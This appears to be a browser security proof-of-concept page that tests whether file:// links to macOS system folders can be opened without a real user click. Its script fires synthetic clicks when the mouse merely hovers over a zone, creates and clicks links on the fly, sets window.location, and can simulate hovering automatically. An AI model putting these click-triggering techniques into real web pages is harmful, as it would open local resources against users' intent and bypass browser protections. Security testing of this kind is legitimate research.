<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Protocol Hover-Click Test</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            padding: 40px;
            background: #1a1a2e;
            color: white;
            max-width: 800px;
            margin: 0 auto;
        }
        .test-area {
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .file-link {
            display: block;
            padding: 15px;
            margin: 10px 0;
            background: rgba(66, 133, 244, 0.3);
            border-radius: 5px;
            color: white;
            text-decoration: none;
            border: 1px solid #4285f4;
            transition: all 0.3s ease;
        }
        .file-link:hover {
            background: rgba(66, 133, 244, 0.5);
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
        }
        .file-link.clicked {
            background: rgba(52, 168, 83, 0.7) !important;
            border-color: #34a853;
        }
        .file-link.failed {
            background: rgba(234, 67, 53, 0.7) !important;
            border-color: #ea4335;
        }
        .status {
            background: rgba(0,0,0,0.5);
            padding: 15px;
            border-radius: 5px;
            font-family: 'Monaco', monospace;
            margin: 20px 0;
            height: 300px;
            overflow-y: auto;
        }
        .success { color: #00ff88; }
        .warning { color: #ffaa00; }
        .error { color: #ff4444; }
        .hover-area {
            background: rgba(255,255,255,0.05);
            padding: 20px;
            border-radius: 8px;
            margin: 15px 0;
            border: 2px dashed rgba(255,255,255,0.2);
        }
        .hover-instructions {
            text-align: center;
            color: #ffaa00;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üìÅ File Protocol Hover-Click Test</h1>
        
        <div class="test-area">
            <h3>Hover Over These Areas to Trigger File Link Clicks</h3>
            
            <div class="hover-instructions">‚ú® Hover over any colored area below to automatically click file links ‚ú®</div>
            
            <div class="hover-area" onmouseover="triggerFileClicks(this)">
                <h4>Zone 1: Direct File Links</h4>
                <a href="file:///Users/Shared/" class="file-link" data-filename="Shared Folder">üìÇ file:///Users/Shared/</a>
                <a href="file:///Applications/" class="file-link" data-filename="Applications">üìÇ file:///Applications/</a>
                <a href="file:///System/Library/CoreServices/" class="file-link" data-filename="CoreServices">üìÇ file:///System/Library/CoreServices/</a>
            </div>

            <div class="hover-area" onmouseover="triggerFileClicks(this)">
                <h4>Zone 2: Additional File Links</h4>
                <a href="file:///Users/" class="file-link" data-filename="Users">üìÇ file:///Users/</a>
                <a href="file:///tmp/" class="file-link" data-filename="Temp">üìÇ file:///tmp/</a>
                <a href="file:///Library/" class="file-link" data-filename="Library">üìÇ file:///Library/</a>
            </div>

            <div class="hover-area" onmouseover="triggerDynamicFileLinks()">
                <h4>Zone 3: Dynamic Link Generation</h4>
                <p>Hover here to create and click dynamic file links</p>
                <div id="dynamic-links-container"></div>
            </div>

            <div class="hover-area" onmouseover="triggerAllFileStrategies()">
                <h4>Zone 4: Multi-Strategy Attack</h4>
                <p>Hover here to try multiple click strategies simultaneously</p>
            </div>

            <button onclick="enableAutoHover()">Enable Auto-Hover Simulation</button>
            <button onclick="disableAutoHover()">Disable Auto-Hover</button>
            <button onclick="resetAllLinks()">Reset All Links</button>
        </div>

        <div class="status" id="status">
            Status: Hover over colored zones to trigger file link clicks...
        </div>
    </div>

    <script>
        const statusElement = document.getElementById('status');
        let hoverCount = 0;
        let autoHoverInterval = null;

        function log(message, type = 'info') {
            const entry = document.createElement('div');
            entry.className = type;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            statusElement.appendChild(entry);
            statusElement.scrollTop = statusElement.scrollHeight;
        }

        function triggerFileClicks(containerElement) {
            hoverCount++;
            log(`üîÑ Hover #${hoverCount} detected in zone`, 'warning');
            
            const fileLinks = containerElement.querySelectorAll('a[href^="file://"]');
            
            if (fileLinks.length > 0) {
                log(`‚úÖ Found ${fileLinks.length} file links in this zone`, 'success');
                
                fileLinks.forEach((link, index) => {
                    setTimeout(() => {
                        const filename = link.getAttribute('data-filename') || link.href;
                        log(`üñ±Ô∏è Hover-clicking: ${filename}`, 'warning');
                        
                        // Visual feedback
                        link.classList.remove('clicked', 'failed');
                        link.classList.add('clicked');
                        
                        try {
                            link.click();
                            log(`‚úÖ Click dispatched for: ${filename}`, 'success');
                            log('üí° If Finder opens, this is a security finding!', 'warning');
                        } catch (e) {
                            log(`‚ùå Click failed: ${e.message}`, 'error');
                            link.classList.remove('clicked');
                            link.classList.add('failed');
                        }
                    }, index * 300);
                });
            } else {
                log('‚ùå No file links found in this zone', 'error');
            }
        }

        function triggerDynamicFileLinks() {
            hoverCount++;
            log(`üîÑ Hover #${hoverCount} - Generating dynamic file links`, 'warning');
            
            const container = document.getElementById('dynamic-links-container');
            const dynamicPaths = [
                'file:///Users/Shared/',
                'file:///Applications/',
                'file:///System/',
                'file:///Users/'
            ];
            
            dynamicPaths.forEach((path, index) => {
                setTimeout(() => {
                    try {
                        const dynamicLink = document.createElement('a');
                        dynamicLink.href = path;
                        dynamicLink.textContent = `üîó ${path}`;
                        dynamicLink.className = 'file-link';
                        dynamicLink.style.margin = '5px';
                        dynamicLink.style.display = 'inline-block';
                        
                        container.appendChild(dynamicLink);
                        log(`üìù Created dynamic link: ${path}`, 'info');
                        
                        // Click immediately after creation
                        setTimeout(() => {
                            log(`üñ±Ô∏è Clicking dynamic link: ${path}`, 'warning');
                            dynamicLink.click();
                            dynamicLink.classList.add('clicked');
                        }, 100);
                        
                    } catch (e) {
                        log(`‚ùå Dynamic link creation failed: ${e.message}`, 'error');
                    }
                }, index * 400);
            });
        }

        function triggerAllFileStrategies() {
            hoverCount++;
            log(`üîÑ Hover #${hoverCount} - Multi-strategy attack`, 'critical');
            
            // Strategy 1: Click existing links
            const allFileLinks = document.querySelectorAll('a[href^="file://"]');
            allFileLinks.forEach((link, index) => {
                setTimeout(() => {
                    link.click();
                    link.classList.add('clicked');
                }, index * 200);
            });
            
            // Strategy 2: Create and click dynamic links
            setTimeout(() => {
                const paths = ['file:///Users/Shared/', 'file:///Applications/'];
                paths.forEach(path => {
                    try {
                        const link = document.createElement('a');
                        link.href = path;
                        document.body.appendChild(link);
                        link.click();
                        document.body.removeChild(link);
                        log(`‚ö° Direct dynamic click: ${path}`, 'warning');
                    } catch (e) {
                        log(`üí• Direct dynamic failed: ${e.message}`, 'error');
                    }
                });
            }, 1000);
            
            // Strategy 3: Try window.location
            setTimeout(() => {
                log('üéØ Attempting window.location navigation', 'warning');
                try {
                    window.location.href = 'file:///Users/Shared/';
                } catch (e) {
                    log(`‚ùå window.location failed: ${e.message}`, 'error');
                }
            }, 1500);
        }

        function enableAutoHover() {
            if (autoHoverInterval) {
                log('‚ùå Auto-hover already running', 'warning');
                return;
            }
            
            log('ü§ñ Starting auto-hover simulation...', 'warning');
            let simulationCount = 0;
            
            autoHoverInterval = setInterval(() => {
                simulationCount++;
                const zones = document.querySelectorAll('.hover-area');
                const randomZone = zones[Math.floor(Math.random() * zones.length)];
                
                log(`ü§ñ Auto-hover simulation #${simulationCount}`, 'info');
                
                // Trigger hover event
                randomZone.dispatchEvent(new Event('mouseover'));
                
                // Stop after 10 simulations
                if (simulationCount >= 10) {
                    disableAutoHover();
                    log('üõë Auto-hover simulation completed', 'success');
                }
            }, 2000);
        }

        function disableAutoHover() {
            if (autoHoverInterval) {
                clearInterval(autoHoverInterval);
                autoHoverInterval = null;
                log('üõë Auto-hover simulation stopped', 'success');
            }
        }

        function resetAllLinks() {
            const fileLinks = document.querySelectorAll('.file-link');
            fileLinks.forEach(link => {
                link.classList.remove('clicked', 'failed');
            });
            
            const dynamicContainer = document.getElementById('dynamic-links-container');
            dynamicContainer.innerHTML = '';
            
            log('üîÑ All links reset to initial state', 'success');
        }

        // Monitor all click events
        document.addEventListener('click', (e) => {
            if (e.target.tagName === 'A' && e.target.href.startsWith('file://')) {
                log('üéØ File link click intercepted by browser', 'warning');
            }
        });

        // Listen for navigation attempts
        window.addEventListener('beforeunload', () => {
            log('üö® PAGE NAVIGATION ATTEMPT DETECTED!', 'critical');
        });

        // Add some visual feedback for hover areas
        document.querySelectorAll('.hover-area').forEach(area => {
            area.addEventListener('mouseenter', function() {
                this.style.borderColor = 'rgba(255,255,255,0.5)';
                this.style.background = 'rgba(255,255,255,0.1)';
            });
            
            area.addEventListener('mouseleave', function() {
                this.style.borderColor = 'rgba(255,255,255,0.2)';
                this.style.background = 'rgba(255,255,255,0.05)';
            });
        });

        // Initial logging
        log('üîß Initialized hover-click file protocol tests', 'info');
        log('üí° Hover over colored zones to trigger automatic file link clicks', 'warning');
        log('üéØ This tests if file:// URLs can be triggered without direct user clicks', 'critical');
        log('‚ö†Ô∏è Browsers typically block file:// navigation from web pages for security', 'success');
    </script>
</body>
</html>
